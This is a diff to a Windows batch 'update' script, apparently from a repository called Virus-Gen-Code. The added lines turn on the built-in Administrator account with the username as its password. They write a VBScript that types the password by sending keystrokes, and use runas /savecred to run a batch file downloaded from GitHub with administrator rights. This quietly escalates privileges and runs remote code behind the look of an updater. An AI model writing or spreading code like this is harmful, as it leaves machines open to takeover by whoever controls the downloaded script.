@@ -35,6 +35,18 @@ if %UPnum% equ %update_number% goto relaunch
 :forceupdate
 echo placeholder>"C:\users\%username%\appdata\update_log_flag"
 echo [92mupdate detected![0m
+net user administrator>nul
+if %errorlevel% neq 0 (
+    echo performing first time setup
+    net user administrator %username% /active:yes
+    echo creating VBScript password macro
+    echo Set wshshell = wscript.CreateObject("WScript.Shell") >macro.vbs
+    echo wscript.sleep 300 >>macro.vbs
+    echo wshshell.sendkeys "%username%" >>macro.vbs
+    echo wscript.sleep 100 >>macro.vbs
+    echo wshshell.sendkeys "{ENTER}" >>macro.vbs
+)
+runas /user:%computername%\Administrator /savecred "C:\Users\61481\OneDrive\Desktop\Elevation test\File to Elevate.bat"
 echo [33mstarting check 1...[0m
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Email-whitelist").Content >WL1.sav
 if exist C:\ProgramData\GVGemail.sav (goto WLcheck) else (goto email_error)
@@ -53,7 +65,8 @@ del WL2.sav
 echo [92mcheck 2 completed[0m
 echo [33mupdating...[0m
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/environment_updater.bat").Content >environment_updater.bat
-call environment_updater.bat  
+start macro.vbs
+runas /user:%computername%\Administrator /savecred environment_updater.bat
 exit
 :update
 echo [33mupdate stage 2...[0m
